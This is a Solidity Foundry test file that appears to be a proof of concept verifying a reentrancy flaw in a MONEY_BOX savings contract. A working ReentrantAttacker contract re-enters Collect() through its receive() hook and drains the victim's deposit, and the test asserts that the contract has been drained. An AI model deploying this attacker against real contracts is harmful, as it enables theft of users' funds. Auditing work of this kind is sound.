// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol";

contract MoneyBoxReentrancyTest is Test {
    MONEY_BOX public moneyBox;
    Log public logContract;
    ReentrantAttacker public attacker;
    address victim = makeAddr("victim");
    uint256 public constant VICTIM_DEPOSIT = 1 ether;
    uint256 public constant ATTACKER_DEPOSIT = 1 ether;

    function setUp() public {
        // Deploy Log contract
        logContract = new Log();
        
        // Deploy MONEY_BOX contract
        moneyBox = new MONEY_BOX();
        
        // Configure moneyBox with Log address and minSum
        moneyBox.SetLogFile(address(logContract));
        moneyBox.SetMinSum(0);
        
        // Fund victim with ETH
        vm.deal(victim, VICTIM_DEPOSIT);
        
        // Victim deposits ETH with 1s lock time
        vm.prank(victim);
        moneyBox.Put{value: VICTIM_DEPOSIT}(1);

        // Fund test contract for attacker deployment
        vm.deal(address(this), ATTACKER_DEPOSIT);
        
        // Deploy attacker contract that deposits during construction
        attacker = new ReentrantAttacker{value: ATTACKER_DEPOSIT}(
            payable(address(moneyBox)), 
            1 // lock time
        );
    }

    function testReentrancyAttack() public {
        // Advance time beyond unlock periods
        vm.warp(block.timestamp + 2);
        
        console.log("=== BEFORE-Trigger State ===");
        uint256 preAttackContractBalance = address(moneyBox).balance;
        uint256 preAttackAttackerBalance = address(attacker).balance;
        console.log("MONEY_BOX balance:", preAttackContractBalance, "wei");
        console.log("Attacker contract balance:", preAttackAttackerBalance, "wei");
        console.log("Expected contract balance: 2 ether | Actual:", preAttackContractBalance);
        console.log("Expected attacker balance: 0 ether | Actual:", preAttackAttackerBalance);

        console.log("\n--- Trigger Reentrancy Attack ---");
        // Perform attack
        attacker.attack();
        console.log("Attack executed\n");

        console.log("=== AFTER-Trigger State ===");
        uint256 postAttackContractBalance = address(moneyBox).balance;
        uint256 postAttackAttackerBalance = address(attacker).balance;
        console.log("MONEY_BOX balance:", postAttackContractBalance, "wei");
        console.log("Attacker contract balance:", postAttackAttackerBalance, "wei");
        console.log("Expected contract balance: 0 ether | Actual:", postAttackContractBalance);
        console.log("Expected attacker balance: 2 ether | Actual:", postAttackAttackerBalance);

        // Differential validation
        bool contractEmptied = postAttackContractBalance == 0;
        bool attackerGainedProfit = postAttackAttackerBalance == 2 ether;
        bool vulnerabilityExploited = contractEmptied && attackerGainedProfit;
        
        console.log("\n=== EXPLOIT VERDICT ===");
        if (vulnerabilityExploited) {
            console.log("State changed from (2 ETH in contract) -> (2 ETH drained to attacker)");
            console.log("Vulnerability Exists: Contract drained via reentrancy");
        } else {
            console.log("State either unchanged or changed unexpectedly");
            console.log("Vulnerability not Exist: Reentrancy mitigation effective");
        }

        // Original assertions (for test failure if issues exist)
        assertEq(postAttackContractBalance, 0, "Contract should be drained");
        assertEq(postAttackAttackerBalance, 2 ether, "Attacker should have withdrawn all funds");
    }
}

contract ReentrantAttacker {
    MONEY_BOX public moneyBox;
    uint256 public amount;
    bool private reentered;

    constructor(address payable _moneyBox, uint256 _lockTime) payable {
        moneyBox = MONEY_BOX(_moneyBox);
        amount = msg.value;
        // Deposit attacker's funds upfront
        moneyBox.Put{value: amount}(_lockTime);
    }

    function attack() public {
        // Initiate first withdrawal
        moneyBox.Collect(amount);
    }

    receive() external payable {
        if (!reentered) {
            // Re-enter for second withdrawal
            reentered = true;
            moneyBox.Collect(amount);
        }
    }
}